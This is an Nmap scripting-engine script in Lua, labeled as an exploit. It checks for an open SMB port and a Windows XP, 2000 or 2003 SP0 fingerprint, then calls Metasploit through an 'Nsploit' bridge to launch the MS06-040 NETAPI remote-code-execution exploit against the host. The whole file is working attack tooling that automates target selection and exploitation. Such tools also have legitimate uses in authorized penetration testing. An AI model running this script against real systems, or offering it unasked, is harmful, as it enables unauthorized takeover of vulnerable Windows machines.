id="ms06_040_netapi"

description="Attempts to exploit the ms06-040 NETAPI vulnerability"

author = "Sussurro <sussurro@happypacket.net>"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"exploit"}

require "Nsploit"
require "stdnse"

portrule = function(host,port)
	local smb_port = { number=445, protocol="tcp" }
        local smb = nmap.get_port_state(host,smb_port)

	if 
		smb ~= nil
		and smb.state == "open"
		and port.service == "microsoft-ds"
		and ( Nsploit.hostMatch(host.os,"Windows XP SP[01]")
			or Nsploit.hostMatch(host.os,"Windows 2000")
			or Nsploit.hostMatch(host.os,"Windows 2003 SP0")
		)
	then
		return true
	else
		return false
	end
end

action = function(host, port)
	local try = nmap.new_try()
	sock = Nsploit.msfInit()
	opts = { TARGET = 0 }	
	return Nsploit.exploit(sock,"windows/smb/ms06_040_netapi","Windows",host.ip,opts)

end
